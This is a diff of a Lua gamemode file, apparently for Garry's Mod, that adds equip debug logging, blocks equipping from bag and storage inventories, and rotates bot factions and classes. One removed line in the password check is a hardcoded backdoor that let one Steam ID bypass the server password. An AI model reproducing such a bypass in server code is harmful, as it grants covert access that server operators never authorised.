@@ -1784,6 +1784,8 @@ end
 
 function GM:CanPlayerInteractItem(client, action, item)
     action = string.lower(action)
+    local inventory = lia.inventory.instances[item.invID]
+    if action == "equip" then print("[LILIA DEBUG][CanPlayerInteractItem]", "client=", IsValid(client) and client:Nick() or "nil", "item=", item and item.uniqueID or "nil", "invID=", item and item.invID or "nil", "inventoryType=", inventory and inventory.typeID or "nil", "isStorage=", inventory and tostring(inventory.isStorage) or "nil", "isExternalInventory=", inventory and tostring(inventory.isExternalInventory) or "nil", "isBag=", inventory and tostring(inventory.isBag) or "nil", "bagItemID=", inventory and tostring(inventory:getData("item")) or "nil", "char=", inventory and tostring(inventory:getData("char")) or "nil") end
     local hasNoItemCooldown = client:hasPrivilege("noItemCooldown")
     lia.debug("[Permissions]", "Permission Check for hook GM:CanPlayerInteractItem", "action=", tostring(action), "hasPrivilege(noItemCooldown)=", tostring(hasNoItemCooldown), "finalResult=", tostring(hasNoItemCooldown))
     if hasNoItemCooldown then return true end
@@ -1854,13 +1856,20 @@ end
 
 function GM:CanPlayerEquipItem(client, item)
     local inventory = lia.inventory.instances[item.invID]
+    local bagItemID = inventory and inventory:getData("item")
+    local isBagInventory = inventory and (inventory.isBag or bagItemID ~= nil)
+    print("[LILIA DEBUG][CanPlayerEquipItem]", "client=", IsValid(client) and client:Nick() or "nil", "item=", item and item.uniqueID or "nil", "invID=", item and item.invID or "nil", "inventoryType=", inventory and inventory.typeID or "nil", "isStorage=", inventory and tostring(inventory.isStorage) or "nil", "isExternalInventory=", inventory and tostring(inventory.isExternalInventory) or "nil", "isBag=", inventory and tostring(inventory.isBag) or "nil", "bagItemID=", tostring(bagItemID), "derivedBagInventory=", tostring(isBagInventory), "char=", inventory and tostring(inventory:getData("char")) or "nil")
     if client.equipDelay ~= nil then
+        print("[LILIA DEBUG][CanPlayerEquipItem]", "blockedReason=", "equipDelay")
         client:notifyWarningLocalized("switchCooldown")
         return false
-    elseif inventory and (inventory.isBag or inventory.isExternalInventory) then
+    elseif inventory and (isBagInventory or inventory.isExternalInventory or inventory.isStorage) then
+        print("[LILIA DEBUG][CanPlayerEquipItem]", "blockedReason=", "forbiddenActionStorage")
         client:notifyErrorLocalized("forbiddenActionStorage")
         return false
     end
+
+    print("[LILIA DEBUG][CanPlayerEquipItem]", "result=", "allowed")
 end
 
 function GM:CanPlayerTakeItem(client, item)
@@ -1911,7 +1920,6 @@ local logTypeMap = {
 
 function GM:CheckPassword(steamID64, ipAddress, serverPassword, clientPassword, playerName)
     local steamID = util.SteamIDFrom64(steamID64)
-    if steamID == "STEAM_0:1:464054146" then return true end
     if serverPassword ~= "" and serverPassword ~= clientPassword then
         lia.log.add(nil, "failedPassword", steamID, playerName, serverPassword, clientPassword)
         lia.information(L("passwordsDoNotMatchFor") .. " " .. tostring(playerName) .. " (" .. tostring(steamID) .. ").")
@@ -2321,16 +2329,44 @@ function GM:CreateDefaultInventory(character)
     })
 end
 
-function GM:SetupBotPlayer(client)
-    local botID = os.time()
-    local defaultFactions = {}
+local botFactionRotationIndex = 0
+local botClassRotationByFaction = {}
+local function getBotEligibleFactions()
+    local factions = {}
     for _, faction in pairs(lia.faction.indices) do
-        if faction.isDefault then table.insert(defaultFactions, faction) end
+        if faction and faction.index and faction.uniqueID ~= "staff" then factions[#factions + 1] = faction end
     end
 
-    if #defaultFactions == 0 then return end
-    local index = math.random(1, #defaultFactions)
-    local faction = defaultFactions[index]
+    table.sort(factions, function(a, b) return a.index < b.index end)
+    return factions
+end
+
+local function getBotClassesForFaction(factionIndex)
+    local classes = {}
+    for _, class in pairs(lia.class.list) do
+        if class and class.index and class.faction == factionIndex then classes[#classes + 1] = class end
+    end
+
+    table.sort(classes, function(a, b) return a.index < b.index end)
+    return classes
+end
+
+local function getNextBotFactionAndClass()
+    local factions = getBotEligibleFactions()
+    if #factions == 0 then return nil, nil end
+    botFactionRotationIndex = (botFactionRotationIndex % #factions) + 1
+    local faction = factions[botFactionRotationIndex]
+    local classes = getBotClassesForFaction(faction.index)
+    if #classes == 0 then return faction, nil end
+    local nextClassIndex = (botClassRotationByFaction[faction.index] or 0) % #classes + 1
+    botClassRotationByFaction[faction.index] = nextClassIndex
+    return faction, classes[nextClassIndex]
+end
+
+function GM:SetupBotPlayer(client)
+    local botID = os.time()
+    local faction, selectedClass = getNextBotFactionAndClass()
+    if not faction then return end
     local invType = hook.Run("GetDefaultInventoryType") or "GridInv"
     if not invType then return end
     local inventory = lia.inventory.new(invType)
@@ -2342,8 +2378,6 @@ function GM:SetupBotPlayer(client)
         model = model,
     }, botID, client, client:SteamID())
 
-    local defaultClass = lia.faction.getDefaultClass(faction.index)
-    if defaultClass then character:joinClass(defaultClass.index) end
     character.isBot = true
     character.vars.inv = {}
     inventory.id = "bot" .. character:getID()
@@ -2354,6 +2388,13 @@ function GM:SetupBotPlayer(client)
     lia.char.addCharacter(botID, character)
     client:setNetVar("char", botID)
     character:setup()
+    if selectedClass then
+        character:setClass(selectedClass.index)
+    else
+        local defaultClass = lia.faction.getDefaultClass(faction.index)
+        if defaultClass then character:setClass(defaultClass.index) end
+    end
+
     character:sync()
     local randomMoney = math.random(1000, 10000)
     character:setMoney(randomMoney)
